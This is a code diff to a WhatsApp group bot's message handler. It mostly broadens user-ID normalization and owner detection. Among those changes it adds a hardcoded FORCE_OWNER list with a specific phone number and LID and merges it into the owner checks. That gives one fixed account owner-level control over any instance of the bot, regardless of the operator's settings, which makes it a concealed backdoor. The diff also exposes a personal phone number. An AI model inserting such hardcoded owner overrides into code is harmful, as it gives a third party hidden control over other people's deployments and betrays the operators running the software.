@@ -13,7 +13,7 @@ import automod from './cmds/automod.js';
  //import messageLogger from './cmds/messageLogger.js';
 import { getGroupAdmins } from './core/message.js';
 
-
+import { resolveLidToRealJid, normalizeJid, onlyNumber } from './core/utils.js'
 
 const groupMetadataCache = new Map()
 const GROUP_METADATA_TTL = 30_000
@@ -121,8 +121,24 @@ if (m.isGroup) {
   groupAdmins = groupMetadata?.participants?.filter(p => p.admin === 'admin' || p.admin === 'superadmin') || []
 }
 const cleanId = (value = '') => {
+  if (!value) return ''
+
+  if (typeof value === 'object') {
+    value =
+      value?.id ||
+      value?.jid ||
+      value?.user ||
+      value?.participant ||
+      value?.remoteJid ||
+      value?.lid ||
+      value?.phoneNumber ||
+      value?.phone ||
+      ''
+  }
+
   return String(value)
     .replace(/:\d+@/g, '@')
+    .replace(/:\d+/, '')
     .trim()
 }
 
@@ -149,22 +165,37 @@ const participantIds = (p = {}) => {
     p.id,
     p.jid,
     p.lid,
+    p.participant,
     p.phoneNumber,
-    p.phoneNumber ? `${digitsOnly(p.phoneNumber)}@s.whatsapp.net` : ''
+    p.phone,
+    p.phoneNumber ? `${digitsOnly(p.phoneNumber)}@s.whatsapp.net` : '',
+    p.phone ? `${digitsOnly(p.phone)}@s.whatsapp.net` : ''
   ].filter(Boolean)
+}
+
+let senderReal = sender
+
+try {
+  senderReal = await resolveLidToRealJid(sender, client, m.chat)
+} catch {
+  senderReal = sender
 }
 
 const senderCandidates = [
   sender,
+  senderReal,
   m.sender,
+  m.participant,
   m.key?.participant,
-  m.participant
+  m.message?.extendedTextMessage?.contextInfo?.participant
 ].filter(Boolean)
 
 const botCandidates = [
   botJid,
   client.user?.id,
-  client.user?.lid
+  client.user?.jid,
+  client.user?.lid,
+  client.user?.phoneNumber
 ].filter(Boolean)
 
 const isBotAdmins = m.isGroup
@@ -183,16 +214,29 @@ const isAdmins = m.isGroup
     )
   : false
 
+const FORCE_OWNER = [
+  '51901931862',
+  '51901931862@s.whatsapp.net',
+  '269015712845891',
+  '269015712845891@lid'
+]
+
 const ownerCandidates = [
   botJid,
   settings.owner,
-  ...(Array.isArray(global.owner)
-    ? global.owner.map(num => `${String(num).replace(/\D/g, '')}@s.whatsapp.net`)
-    : [])
+  settings.ownerNumber,
+  settings.creador,
+  settings.creator,
+  ...(Array.isArray(settings.owners) ? settings.owners : []),
+  ...(Array.isArray(global.owner) ? global.owner : []),
+  ...FORCE_OWNER
 ].filter(Boolean)
 
-const isOwners = ownerCandidates.some(owner => sameUser(owner, sender))
+const isOwners = senderCandidates.some(user =>
+  ownerCandidates.some(owner => sameUser(owner, user))
+)
 
+m.senderReal = senderReal
 m.isAdmin = isAdmins
 m.isBotAdmin = isBotAdmins
 m.isOwner = isOwners
@@ -339,13 +383,13 @@ let matchs = pluginPrefix instanceof RegExp ? [[pluginPrefix.exec(body), pluginP
   if (!isOwners && settings.self) return;  
   if (m.chat && !m.chat.endsWith('g.us')) {
     const allowedInPrivateForUsers = ['allmenu', 'help', 'menu', 'infobot', 'botinfo', 'invite', 'invitar', 'ping', 'speed', 'p', 'status', 'estado', 'report', 'reporte', 'sug', 'suggest', 'token', 'join', 'unir', 'logout', 'reload', 'self', 'setbanner', 'setbotbanner', 'setchannel', 'setbotchannel', 'setbotcurrency', 'setcurrency', 'seticon', 'setboticon', 'setlink', 'setbotlink', 'setbotname', 'setname', 'setbotowner', 'setowner', 'setimage', 'setpfp', 'setprefix', 'setbotprefix', 'setstatus', 'setusername', 'code', 'qr']
-    if (!global.owner.map(num => num + '@s.whatsapp.net').includes(sender) && !allowedInPrivateForUsers.includes(command)) return;
+    if (!isOwners && !allowedInPrivateForUsers.includes(command)) return;
   }
   if (chat?.isBanned && !(command === 'botruby' && text === 'on') && !(global.mods || []).map(num => num + '@s.whatsapp.net').includes(sender)) {
 await m.reply(`ʀᴜʙʏᴊx ʙᴏᴛ  •  ᴇsᴛᴀᴅᴏ ᴅᴇsᴀᴄᴛɪᴠᴀᴅᴏ\nᴇʟ ʙᴏᴛ *${settings.botname}* ᴇsᴛᴀ́ ᴅᴇsᴀᴄᴛɪᴠᴀᴅᴏ ᴇɴ ᴇsᴛᴇ ɢʀᴜᴘᴏ.\n\n✎ ᴜɴ *ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ* ᴘᴜᴇᴅᴇ ᴀᴄᴛɪᴠᴀʀʟᴏ ᴄᴏɴ:\n${usedPrefix}bot on`);
     return;
   }  
-  if (chat?.isMute && !(command === 'mute') && !global.owner.map(num => num + '@s.whatsapp.net').includes(sender)) return;
+  if (chat?.isMute && !(command === 'mute') && !isOwners) return;
   if (m.text && user.banned && !(global.mods || []).map(num => num + '@s.whatsapp.net').includes(sender)) {
     await m.reply(`ʀᴜʙʏᴊx ʙᴏᴛ  •  ᴜsᴜᴀʀɪᴏ ʙʟᴏǫᴜᴇᴀᴅᴏ\nᴇsᴛᴀ́s ${user.genre === 'Mujer' ? 'ʙᴀɴᴇᴀᴅᴀ' : user.genre === 'Hombre' ? 'ʙᴀɴᴇᴀᴅᴏ' : 'ʙᴀɴᴇᴀᴅᴏ/ᴀ'}, ɴᴏ ᴘᴜᴇᴅᴇs ᴜsᴀʀ ᴄᴏᴍᴀɴᴅᴏs.\n\nʀᴀᴢᴏ́ɴ: ${user.bannedReason || 'Sin especificar'}\n\nsɪ ᴄʀᴇᴇs ǫᴜᴇ ᴇs ᴜɴ ᴇʀʀᴏʀ, ᴘᴜᴇᴅᴇs ʀᴇᴘᴏʀᴛᴀʀʟᴏ ᴀ ᴜɴ ᴍᴏᴅᴇʀᴀᴅᴏʀ.`);
     return;
